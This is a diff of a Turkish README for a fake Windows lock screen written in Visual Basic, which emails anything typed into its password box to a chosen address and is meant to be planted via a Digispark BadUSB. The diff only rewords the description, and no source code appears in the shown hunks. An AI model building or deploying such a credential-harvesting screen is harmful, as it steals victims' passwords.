@@ -1,13 +1,16 @@
 # WindowsFakeLockScreen
 <img src="https://i.hizliresim.com/Ii5hUx.png">
 
-Resminden de anlayacağınız gibi sahte bir login ekranıdır programı visual basic ile oluşturdum.
-Mantık şu şekilde programda textbox kısmına girilen herhangi bir yazıyı belirlediğimiz mail adresine göndermektir.
+Üst kısımdaki resimden de anlayacağınız gibi sahte bir login ekranıdır.
+programı visual basic ile oluşturdum.
+Mantık programda textbox kısmına girilen herhangi bir yazıyı belirlediğimiz mail adresine göndermektir.
 Bu programı BadUSB ile birlikte kullanmak amaçlı oluşturdum ve BadUSB olarak Digispark kullandım.
 
 Digispark ile ilgli bilgiye ulaşmak için: https://digistump.com/wiki/digispark bu adrese bakın
 
 Sahte görüntü tamamen bir görseldir sadece TextBox ve Button olan kısım eklenmiştir butonun daha gerçekçi gözükmesi için PictureBox olarak ayarladım.
+
+Programı Visual Studio 2013 Ultimate kullanarak hazırladım
 
 <strong>PROGRAMIN KAYNAK KODU</strong>
 
@@ -69,6 +72,8 @@ Public Class Form1
 End Class
 </code></pre>
 
-Kaynak kodlardan da görebileceğiniz gibi oldukça basit bir kodlamadır kodları ikinci defa yazmamın sebebi girilen texti hem enter tuşuna bastığında hem de ekrandaki ok işaretine bastığı zaman belirlediğimiz mail adresine göndermesi içindir.
+Kaynak kodlardan da görebileceğiniz gibi oldukça basit bir kodlamadır.
+kodları ikinci defa yazmamın sebebi girilen texti hem enter tuşuna bastığında hem de ekrandaki ok işaretine bastığı zaman belirlediğimiz mail adresine göndermesi içindir.
+
 
 
